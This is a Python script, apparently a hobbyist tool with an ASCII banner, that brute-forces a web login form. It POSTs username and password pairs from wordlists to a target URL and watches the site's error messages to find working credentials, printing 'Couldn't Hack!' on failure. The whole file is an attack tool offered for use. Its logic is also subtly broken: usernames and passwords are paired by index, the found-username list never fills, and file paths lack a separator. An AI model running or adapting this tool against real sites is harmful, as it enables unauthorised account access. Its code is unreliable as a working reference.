import requests
import os
import argparse
from prettytable import PrettyTable
import time
   
x = PrettyTable()
delay = 1 # lower this to run faster
banner = """
                                                  
    ,---,.  ,--,                       ,-.            
  ,'  .' |,--.'|                   ,--/ /|            
,---.'   ||  | :            ,--, ,--. :/ |            
|   |   .':  : '          ,'_ /| :  : ' /             
:   :  :  |  ' |     .--. |  | : |  '  /      ,---.   
:   |  |-,'  | |   ,'_ /| :  . | '  |  :     /     \  
|   :  ;/||  | :   |  ' | |  . . |  |   \   /    /  | 
|   |   .''  : |__ |  | ' |  | | '  : |. \ .    ' / | 
'   :  '  |  | '.'|:  | : ;  ; | |  | ' \ \'   ;   /| 
|   |  |  ;  :    ;'  :  `--'   \'  : |--' '   |  / | 
|   :  \  |  ,   / :  ,      .-./;  |,'    |   :    | 
|   | ,'   ---`-'   `--`----'    '--'       \   \  /  
`----'                                       `----'   
                                                      
"""

parser = argparse.ArgumentParser(description='Multipurpose simple brute force')
parser.add_argument('url', metavar='U', type=str, nargs='+',
                    help='URL to brute force')
parser.add_argument('passwordfile', metavar='P', type=str, nargs='+',
                    help='name for the password file')
parser.add_argument('usernamefile', metavar='N', type=str, nargs='+',
                    help='name for the username file')

args = parser.parse_args()

txt_file = open(os.getcwd()+args.usernamefile[0]) # usernames.txt
file_content = txt_file.read()

username_list = file_content.split("\n")
txt_file.close()

txt_filez = open(os.getcwd()+args.passwordfile[0]) # passwords.txt
file_contentz = txt_filez.read()

password_list = file_contentz.split("\n")
txt_filez.close()

i = 0

# Edit these to what the website returns
error_username = "Invalid Username"
error_password = "Invalid Password"

correct_username = []
correct_password = []

url = args.url[0] 

os.system("color 0a && cls") # cosmetic-only code. also probably ruins cross-platform usage :P
print(banner)
while i < len(username_list):
    if correct_username == []:
        values = {'username': username_list[i], 'password': password_list[i]}
    else:
        values = {'username': correct_username[0], 'password': password_list[i]}

    r = requests.post(url, data=values)

    if error_username.lower() in str(r.content).lower():
        x.add_column("ERROR", ["Invalid Username", username_list[i]])
        print(x)
        x.del_column("ERROR")
        time.sleep(delay)
        os.system("cls")
        print(banner)
        #print("Invalid username "+username_list[i])
    elif error_password.lower() in str(r.content).lower():
        x.add_column("ERROR", ["Invalid Password", password_list[i]])
        print(x)
        x.del_column("ERROR")
        #print("Invalid password "+password_list[i])
        if correct_username != []:
            correct_username.append(username_list[i])
            print("Correct username found!")
    else:
        correct_password.append(password_list[i])
        os.system("cls && color 0b")
        print("Logged in successfully with the credentials:\nUsername: "+correct_username[0]+"\nPassword: "+correct_password[0])
        input("")
        raise Exception("exit")


    i += 1
x.add_column("ERROR", ["Couldn't Hack!", "We were unable to hack "+url])
print(x)
x.del_column("ERROR")
